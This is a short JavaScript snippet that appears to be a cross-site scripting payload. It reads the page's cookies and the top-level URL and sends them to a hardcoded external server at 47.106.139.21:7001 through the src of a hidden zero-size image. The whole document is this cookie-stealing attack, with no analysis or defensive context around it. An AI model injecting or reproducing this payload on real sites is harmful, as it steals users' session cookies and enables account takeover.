var img = document.createElement('image');
var ck = document.cookie;
var url = top.location.href;
img.style.height = img.style.width = '0';
img.src = 'http://47.106.139.21:7001/p/xss?s=' + encodeURIComponent(url + '@@' + ck);
document.body.appendChild(img).removeChild(img);
console.log(img);